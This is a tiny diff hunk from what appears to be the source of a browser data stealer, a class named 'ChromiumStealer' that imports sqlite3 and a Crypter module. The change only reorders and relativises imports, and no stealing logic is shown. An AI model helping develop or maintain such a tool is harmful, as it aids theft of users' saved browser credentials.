@@ -1,7 +1,7 @@
 import sqlite3, os, tempfile, string, random, shutil
 
-from browsers import Browsers
-from crypter import Crypter
+from .crypter import Crypter
+from .browsers import Browsers
 
 class ChromiumStealer:
     def __init__(self, browser : Browsers):
